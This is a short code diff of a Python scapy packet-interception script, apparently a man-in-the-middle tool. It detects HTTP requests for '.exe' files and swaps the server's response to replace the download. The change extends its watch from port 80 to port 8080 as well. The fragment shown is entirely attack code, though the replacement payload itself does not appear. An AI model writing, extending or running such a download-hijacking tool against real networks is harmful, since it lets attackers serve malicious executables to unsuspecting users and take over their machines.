@@ -15,11 +15,11 @@ def setLoad(packet, load):
 def processPacket(packet):
     scapyPacket = scapy.IP(packet.get_payload())
     if scapyPacket.haslayer(scapy.Raw):
-        if scapyPacket[scapy.TCP].dport == 80:
+        if scapyPacket[scapy.TCP].dport == 80 or scapyPacket[scapy.TCP].dport == 8080:
             if ".exe" in scapyPacket[scapy.Raw].load.decode():
                 print("[+] exe Request")
                 ackList.append(scapyPacket[scapy.TCP].ack)
-        elif scapyPacket[scapy.TCP].sport == 80:
+        elif scapyPacket[scapy.TCP].sport == 80 or scapyPacket[scapy.TCP].sport == 8080:
             if scapyPacket[scapy.TCP].seq in ackList:
                 ackList.remove(scapyPacket[scapy.TCP].seq)
                 print("[+] Replacing file")
